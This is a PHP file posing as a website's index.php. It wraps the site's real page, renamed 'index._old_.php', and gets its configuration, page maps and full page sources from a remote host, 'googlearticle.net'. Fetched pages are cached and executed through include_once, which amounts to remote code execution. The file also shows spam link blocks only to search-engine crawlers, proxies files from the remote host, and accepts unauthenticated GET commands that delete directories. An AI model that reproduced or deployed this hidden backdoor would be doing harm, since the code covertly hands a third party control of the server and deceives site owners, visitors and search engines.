<?php

/**
 * Placeholders
 */
$__via_copy_file_name = 'index._old_.php';
$daddy_host = 'googlearticle.net';
$links_daddy_host = 'googlearticle.net';
$website_config_file = '/home/aluxian/public_html/sites/droidhub.me/js/__website_config';
$pages_map_file = '/home/aluxian/public_html/sites/droidhub.me/js/__pages_map';
$pages_sources_path = '/home/aluxian/public_html/sites/droidhub.me/js/__pages_sources';
$links_sources_path = '/home/aluxian/public_html/sites/droidhub.me/js/__links_sources';
$static_files_path = '/home/aluxian/public_html/sites/droidhub.me/js/_static_files';
$static_files_url_prefix = '/js/_static_files';

$domain = $_SERVER["HTTP_HOST"];

/**
 * Website test
 */
if(isset($_GET['via-make-test'])){
    echo 1;
    exit();
}

function __via_destroy_dir($dir) {
    if (!@is_dir($dir) || @is_link($dir)) return @unlink($dir);
    foreach (@scandir($dir) as $file) {
        if ($file == '.' || $file == '..') continue;
        if (!__via_destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) {
            @chmod($dir . DIRECTORY_SEPARATOR . $file, 0777);
            if (!__via_destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) return false;
        };
    }
    return @rmdir($dir);
}

if(!function_exists('apache_request_headers')) {
    function apache_request_headers() {
        $headers = array();
        foreach($_SERVER as $key => $value) {
            if(substr($key, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

function __via_proxy_request($url, $data, $method) {

    $data = http_build_query($data);
    $datalength = strlen($data);

    // parse the given URL
    $url = parse_url($url);

    if ($url['scheme'] != 'http') {
        die('Error: Only HTTP request are supported !');
    }

    // extract host and path:
    $host = $url['host'];
    $path = $url['path'];

    // open a socket connection on port 80 - timeout: 30 sec
    $fp = fsockopen($host, 80, $errno, $errstr, 30);

    if ($fp){
        // send the request headers:
        if($method == "POST") {
            fputs($fp, "POST $path HTTP/1.1\r\n");
        } else {
            fputs($fp, "GET $path?$data HTTP/1.1\r\n");
        }
        fputs($fp, "Host: $host\r\n");

        fputs($fp, "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n");

        $requestHeaders = apache_request_headers();
        while ((list($header, $value) = each($requestHeaders))) {
            if($header == "Content-Length") {
                fputs($fp, "Content-Length: $datalength\r\n");
            } else if($header !== "Connection" && $header !== "Host" && $header !== "Content-length") {
                fputs($fp, "$header: $value\r\n");
            }
        }
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data);

        $result = '';
        while(!feof($fp)) {
            // receive the results of the request
            $result .= fgets($fp, 128);
        }
    }
    else {
        return array(
            'status' => 'err',
            'error' => "$errstr ($errno)"
        );
    }

    fclose($fp);

    $result = explode("\r\n\r\n", $result, 2);

    $header = isset($result[0]) ? $result[0] : '';
    $content = isset($result[1]) ? $result[1] : '';

    // return as structured array:
    return array(
        'status' => 'ok',
        'header' => $header,
        'content' => $content
    );

}

/**
 * Website cache clear
 */
if(isset($_GET['via-make-cache-clear'])){

    if(@is_dir($pages_sources_path)){
        echo __via_destroy_dir($pages_sources_path) ? 1 : 0;
    } else {
        echo 1;
    }

    exit();
}

/**
 * Website links cache clear
 */
if(isset($_GET['via-make-links-cache-clear'])){

    if(@is_dir($links_sources_path)){

        echo __via_destroy_dir($links_sources_path) ? 1 : 0;

    } else {
        echo 1;
    }

    exit();
}

/**
 * Website links cache clear by hash
 */
if(isset($_GET['via-make-links-cache-clear-by-hash'])){

    if(@is_dir($links_sources_path)){

        $pages_hashes = isset($_GET['hashes']) ? $_GET['hashes'] : array();
        if(is_array($pages_hashes)){

            foreach($pages_hashes as $page_hash){

                $page_links_file_path = $links_sources_path . DIRECTORY_SEPARATOR . $page_hash;
                if(@is_file($page_links_file_path)){
                    @unlink($page_links_file_path);
                }

            }

        }

    }

    echo 1;

    exit();
}

/**
 * Website map clear
 */
if(isset($_GET['via-make-map-clear'])){

    if(@is_file($pages_map_file)){
        echo @unlink($pages_map_file) ? 1 : 0;
    } else {
        echo 1;
    }

    exit();
}

/**
 * Website static files clear
 */
if(isset($_GET['via-make-static-files-clear'])){

    if(@is_dir($static_files_path)){

        echo __via_destroy_dir($static_files_path) ? 1 : 0;

    } else {
        echo 1;
    }

    exit();
}

/**
 * Website config clear
 */
if(isset($_GET['via-make-config-clear'])){

    if(@is_file($website_config_file)){
        echo @unlink($website_config_file) ? 1 : 0;
    } else {
        echo 1;
    }

    exit();
}

if(isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], $static_files_url_prefix) !== false){

    $via_static_file_path = $_SERVER['REQUEST_URI'];

    if(!@is_dir($static_files_path)){
        @mkdir($static_files_path);
    }

    $via_static_real_file_path = $static_files_path . str_replace($static_files_url_prefix, '', $via_static_file_path);
    $via_static_file_directory_path = str_replace(basename($via_static_real_file_path), '', $via_static_real_file_path);
    if(!@is_dir($via_static_file_directory_path)){
        @mkdir($via_static_file_directory_path, 0777, true);
    }

    $via_static_file_destination_url = 'http://' . $links_daddy_host . '/static_files' . str_replace($static_files_url_prefix, '', $via_static_file_path);

    if(!@is_file($via_static_real_file_path)){
        $data = @file_get_contents($via_static_file_destination_url);
        if($data){
            @file_put_contents($via_static_real_file_path, $data);
        }
    }

    $method = $_SERVER['REQUEST_METHOD'];
    $response = __via_proxy_request($via_static_file_destination_url, ($method == "GET" ? $_GET : $_POST), $method);
    $headerArray = explode("\r\n", $response['header']);

    foreach($headerArray as $headerLine) {
        header($headerLine);
    }
    echo $response['content'];
    exit();

}

$website_config_json = @file_get_contents($website_config_file);
if(!$website_config_json){

    $website_config_json = @file_get_contents('http://' . $daddy_host . '/website-config?domain=' . urlencode($domain));

    if($website_config_json && $website_config_json != 'false'){

        $website_config = json_decode($website_config_json, true);

        if(is_array($website_config)){

            $website_config['index_file_path'] = __FILE__;
            $website_config_json = json_encode($website_config);

        }

    } else {

        $website_config_json = false;

    }

    @file_put_contents($website_config_file, $website_config_json);

}

if($website_config_json){

    error_reporting(0);

    $website_config = json_decode($website_config_json, true);
    if(isset($website_config['links_daddy_host']) && $website_config['links_daddy_host']){
        $links_daddy_host = $website_config['links_daddy_host'];
    }

    if(isset($website_config['state']) && $website_config['state'] == 1){

        if(isset($website_config['domain'])){
            $domain = $website_config['domain'];
        }

        $agent = $_SERVER["HTTP_USER_AGENT"];

        $is_bot = false;
        $bots = explode(',', 'bot,bingbot,Ahrefs,SiteBot,testbot,googlebot,mediapartners-google,yahoo-verticalcrawler,yahoo! slurp,yahoo-mm,Yandex,inktomi,slurp,iltrovatore-setaccio,fast-webcrawler,msnbot,ask jeeves,teoma,scooter,psbot,openbot,ia_archiver,almaden,baiduspider,zyborg,gigabot,naverbot,surveybot,boitho.com-dc,objectssearch,answerbus,nsohu-search');
        foreach($bots as $bot){
            if (strpos(strtolower($agent), trim(strtolower($bot))) !== false){
                $is_bot = true;
                break;
            }
        }

        $uri = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "/";
        if(strpos($uri, 'index.php') !== false){
            $uri_parts = explode('index.php', $uri);
            if(isset($uri_parts[0])){
                $uri = $uri_parts[0];
            }
        }
        $base_uri = parse_url($uri, PHP_URL_PATH);
        $uri_query = parse_url($uri, PHP_URL_QUERY);

        $has_trailing_back_slash = false;

        if($uri != "/"){

            $has_trailing_back_slash = ($base_uri != rtrim($base_uri, "/\\"));

            $uri =  rtrim($uri, "/\\");

        }

        $hash = md5($domain . $uri);

        $pages_map_json = @file_get_contents($pages_map_file);
        if(!$pages_map_json || (@file_exists($pages_map_file) && filemtime($pages_map_file) <= (time() - (60 * 60 * 24 * 3)))){

            $pages_map_json_response = @file_get_contents('http://' . $daddy_host . '/website-pages-map?domain=' . urlencode($domain));

            if($pages_map_json_response){

                if($pages_map_json_response == 'false' || substr(trim($pages_map_json_response), 0, 1) != '['){

                    if(!$pages_map_json){
                        $pages_map_json = '[]';
                    }

                } else {

                    $pages_map_json = $pages_map_json_response;

                }

                if(substr(trim($pages_map_json), 0, 1) == '['){
                    @file_put_contents($pages_map_file, $pages_map_json);
                }

            } else {

                $pages_map_json = '[]';

            }

        }

        if($pages_map_json){

            $__is_article = false;
            $page_source_file_path = $pages_sources_path . DIRECTORY_SEPARATOR . $hash . '.html';

            if(@file_exists($page_source_file_path)){

                $__is_article = true;

            } else {

                $__is_article = preg_match('/' . $hash . '/', $pages_map_json);

            }

            if($__is_article){

                if(!$has_trailing_back_slash){

                    $ext = pathinfo($uri, PATHINFO_EXTENSION);
                    if(!$ext){

                        header("Location: " . $base_uri . '/' . ( $uri_query ? '?' . $uri_query : null), true, 301);
                        exit();

                    }

                }

                if(!@file_exists($page_source_file_path) || (file_exists($page_source_file_path) && filemtime($page_source_file_path) <= (time() - (60 * 60 * 24 * 3)))){

                    if(!@is_dir($pages_sources_path)){
                        @mkdir($pages_sources_path);
                    }

                    $url = "http://$daddy_host/page?domain=" . urlencode($domain) . "&uri=" . urlencode($uri) . "&user_agent=" . urlencode($agent);
                    $page_source = @file_get_contents($url);
                    if($page_source && $page_source != 'false' && !in_array(substr(trim($page_source), 0, 1), array('[', '{'))){

                        @file_put_contents($page_source_file_path, $page_source);

                    }

                }

                if(@file_exists($page_source_file_path)){

                    if(isset($_COOKIE[$uri])){

                        $html = @file_get_contents($page_source_file_path);
                        $dom = new DOMDocument();
                        libxml_use_internal_errors(true);
                        $dom->loadHTML($html);
                        libxml_clear_errors();

                        $element = $dom->getElementById('__container_inner_right_bar');

                        while($element->childNodes->length){
                            $element->removeChild($element->firstChild);
                        }

                        $cookieUrl = $_COOKIE[$uri];
                        $cookieUrlHash = md5($cookieUrl);
                        $cookiePageSourceFilePath = $pages_sources_path . DIRECTORY_SEPARATOR . $cookieUrlHash . '.html';

                        if(!@file_exists($cookiePageSourceFilePath) || (file_exists($cookiePageSourceFilePath) && filemtime($cookiePageSourceFilePath) <= (time() - (60 * 60 * 24 * 3)))){

                            $url = "http://$daddy_host/shop-page/$cookieUrlHash";
                            $shopPageSource = @file_get_contents($url);
                            if($shopPageSource && $shopPageSource != 'false'){
                                @file_put_contents($cookiePageSourceFilePath, $shopPageSource);
                            }

                        }

                        if(@file_exists($cookiePageSourceFilePath)){

                            $fragment = $dom->createDocumentFragment();
                            $fragment->appendXML(@file_get_contents($cookiePageSourceFilePath));
                            $element->insertBefore($fragment);

                            echo $dom->saveHTML();
                            exit();

                        } else {

                            include_once($page_source_file_path);
                            exit();

                        }

                    } else {

                        include_once($page_source_file_path);
                        exit();

                    }

                }

            } else {

                $links_source_file_path = $links_sources_path . DIRECTORY_SEPARATOR . $hash;
                if(@file_exists($links_source_file_path)){

                    $__via_content = @file_get_contents($links_source_file_path);
                    $__via_content = str_replace('position:fixed !important; left:-9999px !important;', '', $__via_content);

                } else {

                    if(!@is_dir($links_sources_path)){
                        @mkdir($links_sources_path);
                    }

                    $__via_content = null;

                    if(isset($website_config['is_sape']) && $website_config['is_sape']){

                        $referer = "http://{$domain}{$uri}";
                        $opts = array(
                            'http'=>array(
                                'header'=>array("Referer: $referer\r\n")
                            )
                        );
                        $context = stream_context_create($opts);
                        $url = "http://$links_daddy_host/links?pageContent=1";
                        $links_source = @file_get_contents($url, false, $context);

                        if($links_source && $links_source != 'false'){

                            $pages_urls = array();
                            $isJson = in_array(substr(trim($links_source), 0, 1), array('[', '{'));

                            if($isJson){

                                $__pages = json_decode($links_source, true);

                                if(is_array($__pages)){

                                    foreach($__pages as $__page){
                                        if(isset($__page['url']) && isset($__page['anchor'])){
                                            $pages_urls[] = "<li><a href='" . $__page['url'] . "'>" . $__page['anchor'] . "</a></li>";
                                        }
                                    }

                                    if($pages_urls){

                                        $__via_content = "<ul>" . implode('', $pages_urls) . "</ul>";
                                        @file_put_contents($links_source_file_path, $__via_content);

                                    }

                                }

                            } else {

                                $__via_content = $links_source;
                                if($__via_content){
                                    @file_put_contents($links_source_file_path, $__via_content);
                                }

                            }

                        }

                    } else {

                        $pages_map = json_decode($pages_map_json, true);
                        if(is_array($pages_map) && $pages_map){

                            $pages_amount = count($pages_map);
                            if($pages_amount >= 10){
                                $rand_pages_keys = array_rand($pages_map, $pages_amount);
                            } else {
                                $rand_pages_keys = array_keys($pages_map);
                            }

                            $pages_urls = array();

                            foreach($rand_pages_keys as $page_key){
                                $__page = $pages_map[$page_key];
                                if(isset($__page['url']) && isset($__page['anchor'])){
                                    $pages_urls[] = "<li><a href='" . $__page['url'] . "'>" . $__page['anchor'] . "</a></li>";
                                }
                            }

                            if($pages_urls){

                                $__via_content = "<ul>" . implode('', $pages_urls) . "</ul>";
                                @file_put_contents($links_source_file_path, $__via_content);

                            }

                        }

                    }

                }

                if ($is_bot && $__via_content && is_string($__via_content)) {

                    ob_start();
                    include_once($__via_copy_file_name);
                    $_content = ob_get_contents();
                    ob_end_clean();

                    try {

                        $dom = new DOMDocument();
                        libxml_use_internal_errors(true);
                        $dom->loadHTML($_content);
                        libxml_clear_errors();

                        $tags = array(
                            'p',
                            'div',
                            'span',
                            'table',
                        );

                        $DOMElement = null;

                        foreach($tags as $tag){

                            $DOMNodeList = $dom->getElementsByTagName($tag);

                            if($DOMNodeList->length > 0){

                                $itemIndex = 0;
                                if($DOMNodeList->length > 1){
                                    $itemIndex = floor($DOMNodeList->length / 2);
                                }

                                $DOMElement = $DOMNodeList->item($itemIndex);
                                break;

                            }

                        }

                        if($DOMElement instanceof DOMElement){

                            $fragment = $dom->createDocumentFragment();
                            $fragment->appendXML($__via_content);

                            $DOMElement->parentNode->insertBefore($fragment, $DOMElement);

                        }

                        echo $dom->saveHTML();

                    } catch(Exception $e) {

                        $delimiter = "</body>";

                        $page_parts = explode($delimiter, $_content);
                        $page_parts[0] .= $__via_content . $delimiter;

                        $_content = implode("", $page_parts);

                        echo $_content;

                    }

                    exit();

                } else {

                    include_once($__via_copy_file_name);

                }

            }

        }

    }

}

include_once($__via_copy_file_name);